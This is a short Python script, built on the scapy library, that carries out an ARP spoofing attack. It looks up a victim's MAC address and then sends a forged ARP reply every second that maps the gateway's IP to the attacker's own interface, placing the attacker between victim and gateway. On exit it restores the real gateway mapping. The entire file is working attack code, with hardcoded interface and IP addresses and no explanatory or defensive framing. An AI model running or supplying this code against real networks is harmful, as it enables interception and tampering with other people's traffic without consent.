from scapy.all import *
import sys
import os
import time
import logging
import atexit

class ARPSpoof:
    def __init__(self, interface, victimIP, gatewayIP):
        self.interface = interface
        self.victimIP = victimIP
        self.gatewayIP = gatewayIP

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = self.interface, inter = 0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        gatewayMAC = self.get_mac(self.gatewayIP)
        send(ARP(op = 2, pdst = self.victimIP, psrc = self.gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
        sys.exit(1)

    def trick(self, vm):
        local_mac = get_if_hwaddr(self.interface)
        sendp(Ether(dst = vm)/ARP(op = 2, pdst = self.victimIP, psrc = self.gatewayIP, hwdst= vm, hwsrc = local_mac), iface = self.interface)

    def run(self):
        victimMAC = self.get_mac(self.victimIP)
        atexit.register(self.reARP)
        while True:
            self.trick(victimMAC)
            time.sleep(1)

if __name__ == "__main__":
    arpspoof = ARPSpoof("eth0", "169.254.127.207", "169.254.137.254").run()
